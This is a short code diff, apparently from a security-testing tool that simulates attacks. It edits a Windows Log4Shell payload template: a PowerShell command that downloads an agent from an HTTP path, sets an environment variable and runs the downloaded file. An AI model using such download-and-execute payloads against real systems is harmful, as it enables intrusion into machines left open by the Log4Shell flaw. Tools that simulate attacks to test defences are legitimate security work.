@@ -49,7 +49,7 @@ LOG4SHELL_LINUX_COMMAND = (
 LOG4SHELL_WINDOWS_COMMAND = (
     'powershell -NoLogo -Command "'
     "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing; "
-    "set %(agent_otp_environment_variable)s=%(agent_otp)s && "
+    "$env:%(agent_otp_environment_variable)s=%(agent_otp)s ; "
     '%(monkey_path)s %(monkey_type)s %(parameters)s"'
 )
 DOWNLOAD_TIMEOUT = 180
